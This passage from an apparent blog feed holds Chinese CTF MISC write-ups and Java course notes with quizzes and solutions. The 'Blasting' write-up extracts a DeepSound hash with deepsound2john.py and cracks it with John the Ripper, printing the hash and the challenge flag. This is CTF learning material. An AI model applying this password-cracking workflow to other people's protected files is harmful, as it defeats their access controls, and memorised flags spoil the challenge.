keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.png'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"高新区初赛misc\"><a class=\"anchor\" href=\"#高新区初赛misc\">#</a> 高新区初赛 MISC</h1>\n<p>HalfQR<br />\n 使用工具<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oMzExMHcwcjFkLmNvbS9xcmF6eWJveC8=\">点击这里</span><br />\n Qrazybox<br />\n 在纠错位 L，mask 为 2 调试出 flag<br />\n<img data-src=\"/img/MISC/gaoxinqu.jpg\" alt=\"avatar\" /><br />\n<img data-src=\"/img/MISC/gaoxinqu2.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"misc3-眼神要好使得到的flag中的内容请md5后上交-blasting的附件\"><a class=\"anchor\" href=\"#misc3-眼神要好使得到的flag中的内容请md5后上交-blasting的附件\">#</a> MISC3 - 眼神要好使，得到的 flag 中的内容请 md5 后上交 - blasting 的附件</h1>\n<p>Blasting 是爆破的意思考虑到要爆破<br />\n<img data-src=\"/img/MISC/blasting1.jpg\" alt=\"avatar\" /></p>\n<p>得到 3 个文件<br />\n先看音频<br />\n<img data-src=\"/img/MISC/blasting2.jpg\" alt=\"avatar\" /></p>\n<p>48000hz 会出来一部分 flag<br />\n 继续看两个图片<br />\n<img data-src=\"/img/MISC/blasting3.jpg\" alt=\"avatar\" /></p>\n<p>第二张图片出现错误怀疑爆破宽度<br />\n先改一下宽度<br />\n<img data-src=\"/img/MISC/blasting4.jpg\" alt=\"avatar\" /></p>\n<p>直接复原了<br />\n两张一摸一样的图<br />\n<img data-src=\"/img/MISC/blasting5.jpg\" alt=\"avatar\" /></p>\n<p>猜测盲水印<br />\n用盲水印脚本<br />\n<img data-src=\"/img/MISC/blasting6.jpg\" alt=\"avatar\" /></p>\n<p>得到提示<br />\n Deepsound，网上搜一下，是个音频隐藏工具下载<br />\n<img data-src=\"/img/MISC/blasting7.jpg\" alt=\"avatar\" /></p>\n<p>然后把音频放入要密码…… 太烦了<br />\n这里考虑到了爆破，上 kali<br />\n 用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4vYmxvYi9ibGVlZGluZy1qdW1iby9ydW4vZGVlcHNvdW5kMmpvaG4ucHk=\"> https://github.com/openwall/john/blob/bleeding-jumbo/run/deepsound2john.py</span><br />\ndeepsound2john.py 脚本<br />\n<img data-src=\"/img/MISC/blasting8.jpg\" alt=\"avatar\" /></p>\n<p>得到<br />\n john.wav:$dynamic_1529$7242ef6f559962f7e928afc8be404f611557e267<br />\n 然后直接 john 一下<br />\n<img data-src=\"/img/MISC/blasting9.jpg\" alt=\"avatar\" /></p>\n<p>得到下面的数据！@#$%^&amp;*<br />\n 看起来像密码试一下<br />\n成功<br />\n<img data-src=\"/img/MISC/blasting10.jpg\" alt=\"avatar\" /></p>\n<p>得到 flag.txt<br />\n 打开文件<br />\n<img data-src=\"/img/MISC/blasting11.jpg\" alt=\"avatar\" /></p>\n<p 725456a7196c09b559ccd441738b0cae=\"\">最后 flag {iheatradio}<br />\n Iheatradio 中间 md5 加密一下<br />\n flag</p>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/java/course-1/week-2/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/java/course-1/week-2/",
            "title": "第2周 判断",
            "date_published": "2020-04-13T11:12:45.000Z",
            "content_html": "<p>:::note info<br />\n 以下为个人学习笔记和习题整理<br />\n课程：零基础学 Java 语言 - 浙江大学 - 翁恺 @ 中国大学 MOOC<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWNvdXJzZTE2My5vcmcvY291cnNlL1pKVS0xMDAxNTQxMDAx\">https://www.icourse163.org/course/ZJU-1001541001</span><br />\n:::</p>\n<h1 id=\"课堂笔记\"><a class=\"anchor\" href=\"#课堂笔记\">#</a> 课堂笔记</h1>\n<h2 id=\"关系运算\"><a class=\"anchor\" href=\"#关系运算\">#</a> 关系运算</h2>\n<ul>\n<li>六个关系运算符：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>运算符</th>\n<th>意义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>==</td>\n<td>相等</td>\n</tr>\n<tr>\n<td>!=</td>\n<td>不相等</td>\n</tr>\n<tr>\n<td>&gt;</td>\n<td>大于</td>\n</tr>\n<tr>\n<td>&gt;=</td>\n<td>大于或等于</td>\n</tr>\n<tr>\n<td>&lt;</td>\n<td>小于</td>\n</tr>\n<tr>\n<td>&lt;=</td>\n<td>小于或等于</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>关系运算结果为  <code>true</code>  或  <code>false</code></li>\n<li>优先级\n<ul>\n<li>所有关系运算符的优先级比算术运算低，但比赋值运算高</li>\n<li>判断是否相等的 == 和！= 优先级比其他的低</li>\n<li>连续的关系运算是从左到右进行的</li>\n</ul>\n</li>\n<li>判断两个浮点数是否相等的方法</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">abs</span><span class=\"token punctuation\">(</span>f1<span class=\"token operator\">-</span>f2<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0.0000001</span></pre></td></tr></table></figure><ul class=\"task-list\">\n<li>下列表达式中错误的有？</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" disabled=\"true\" /><label for=\"cbx_0\"> 5 &gt; 3 == 6 &gt; 4</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_1\"> 6 &gt; 5 &gt; 4</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_2\" disabled=\"true\" /><label for=\"cbx_2\"> a == b == true</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_3\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_3\"> a == b == 6</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_4\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_4\"> a ==  b &gt; false</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_5\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_5\"> (a == b) &gt; false<br />\n <code>true 和 false 不能比较大小</code> </label></li>\n</ul>\n<h2 id=\"判断语句-if-else\"><a class=\"anchor\" href=\"#判断语句-if-else\">#</a> 判断语句 if else</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"多路分支-switch-case\"><a class=\"anchor\" href=\"#多路分支-switch-case\">#</a> 多路分支 switch case</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ul>\n<li>计算 switch 后面的控制表达式以后，程序会跳到相应的 case，但是如果这个 case 内部没有 break，那么在执行完语句后，就会顺序执行到下面的 case，直到遇到 break 或者 switch 结束。</li>\n</ul>\n<h1 id=\"小测验\"><a class=\"anchor\" href=\"#小测验\">#</a> 小测验</h1>\n<ol>\n<li class=\"quiz essay\">\n<p>写出以下代码段的执行结果：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> num<span class=\"token operator\">=</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span> max<span class=\"token operator\">=</span><span class=\"token number\">30</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">>=</span> max<span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zhang\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"huang\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zhu\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>huang<br />\nzhu</p>\n</blockquote>\n</li>\n<li class=\"quiz essay\">\n<p>写出以下代码段的执行结果：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> limit <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> num1 <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> num2 <span class=\"token operator\">=</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> limit <span class=\"token operator\">&lt;=</span> limit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num1 <span class=\"token operator\">==</span> num2 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lemon\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"grape\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>lime<br />\ngrape</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"编程题\"><a class=\"anchor\" href=\"#编程题\">#</a> 编程题</h1>\n<h2 id=\"题目1-时间换算5分\"><a class=\"anchor\" href=\"#题目1-时间换算5分\">#</a> 题目 1. 时间换算（5 分）</h2>\n<ul>\n<li>\n<p><strong>题目内容</strong><br />\n UTC 是世界协调时，BJT 是北京时间，UTC 时间相当于 BJT 减去 8。现在，你的程序要读入一个整数，表示 BJT 的时和分。整数的个位和十位表示分，百位和千位表示小时。如果小时小于 10，则没有千位部分；如果小时是 0，则没有百位部分；如果分小于 10 分，需要保留十位上的 0。如 1124 表示 11 点 24 分，而 905 表示 9 点 5 分，36 表示 0 点 36 分，7 表示 0 点 7 分。</p>\n<p>有效的输入范围是 0 到 2359，即你的程序不可能从测试服务器读到 0 到 2359 以外的输入数据。</p>\n<p>你的程序要输出这个时间对应的 UTC 时间，输出的格式和输入的相同，即输出一个整数，表示 UTC 的时和分。整数的个位和十位表示分，百位和千位表示小时。如果小时小于 10，则没有千位部分；如果小时是 0，则没有百位部分；如果分小于 10 分，需要保留十位上的 0。</p>\n<p><em>提醒：要小心跨日的换算。</em></p>\n</li>\n<li>\n<p><strong>输入格式</strong><br />\n一个整数，表示 BJT 的时和分。整数的个位和十位表示分，百位和千位表示小时。如果小时小于 10，则没有千位部分；如果小时是 0，则没有百位部分；如果小时不是 0 而且分小于 10 分，需要保留十位上的 0。</p>\n</li>\n<li>\n<p><strong>输出格式</strong><br />\n一个整数，表示 UTC 的时和分。整数的个位和十位表示分，百位和千位表示小时。如果小时小于 10，则没有千位部分；如果小时是 0，则没有百位部分；如果小时不是 0 而且分小于 10 分，需要保留十位上的 0。</p>\n</li>\n<li>\n<p><strong>输入样例</strong><br />\n 933</p>\n</li>\n<li>\n<p><strong>输出样例</strong><br />\n 133</p>\n</li>\n</ul>\n<h3 id=\"解题代码\"><a class=\"anchor\" href=\"#解题代码\">#</a> 解题代码</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token class-name\">Scanner</span> in <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> bjt <span class=\"token operator\">=</span> in<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> utc <span class=\"token operator\">=</span> bjt <span class=\"token operator\">-</span> <span class=\"token number\">800</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>utc <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\tutc <span class=\"token operator\">+=</span> <span class=\"token number\">2400</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 时为负数，则进行隔日计算</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>utc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"题目2-信号报告5分\"><a class=\"anchor\" href=\"#题目2-信号报告5分\">#</a> 题目 2. 信号报告（5 分）</h2>\n<ul>\n<li>\n<p><strong>题目内容</strong><br />\n无线电台的 RS 制信号报告是由三两个部分组成的：</p>\n<p>R (Readability) 信号可辨度即清晰度.</p>\n<p>S (Strength)    信号强度即大小.</p>\n<p>其中 R 位于报告第一位，共分 5 级，用 1—5 数字表示.</p>\n<blockquote>\n<p>1---Unreadable</p>\n<p>2---Barely readable, occasional words distinguishable</p>\n<p>3---Readable with considerable difficulty</p>\n<p>4---Readable with practically no difficulty</p>\n<p>5---Perfectly readable</p>\n</blockquote>\n<p>报告第二位是 S，共分九个级别，用 1—9 中的一位数字表示</p>\n<blockquote>\n<p>1---Faint signals, barely perceptible</p>\n<p>2---Very weak signals</p>\n<p>3---Weak signals</p>\n<p>4---Fair signals</p>\n<p>5---Fairly good signals</p>\n<p>6---Good signals</p>\n<p>7---Moderately strong signals</p>\n<p>8---Strong signals</p>\n<p>9---Extremely strong signals</p>\n</blockquote>\n<p>现在，你的程序要读入一个信号报告的数字，然后输出对应的含义。如读到 59，则输出：\t<br />\n <code>\tExtremely strong signals, perfectly readable.\t</code></p>\n</li>\n<li>\n<p><strong>输入格式</strong><br />\n一个整数，信号报告。整数的十位部分表示可辨度，个位部分表示强度。输入的整数范围是 [11,59] 内有效的数字，这个范围外的数字不可能出现在测试数据中。</p>\n</li>\n<li>\n<p><strong>输出格式</strong><br />\n一句话，表示这个信号报告的意义。按照题目中的文字，先输出表示强度的文字，跟上逗号和空格，然后是表示可辨度的文字，跟上句号。注意可辨度的句子的第一个字母是小写的。注意这里的标点符号都是英文的。</p>\n</li>\n<li>\n<p><strong>输入样例</strong><br />\n 33</p>\n</li>\n<li>\n<p><strong>输出样例</strong><br />\n Weak signals, readable with considerable difficulty.</p>\n</li>\n</ul>\n<h3 id=\"解题代码-2\"><a class=\"anchor\" href=\"#解题代码-2\">#</a> 解题代码</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token class-name\">Scanner</span> in <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> rs <span class=\"token operator\">=</span> in<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> readability <span class=\"token operator\">=</span> rs <span class=\"token operator\">/</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> strength <span class=\"token operator\">=</span> rs <span class=\"token operator\">%</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>strength<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Faint signals, barely perceptible\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Very weak signals\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Weak signals\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Fair signals\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Fairly good signals\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">6</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Good signals\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">7</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Moderately strong signals\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">8</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Strong signals\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token 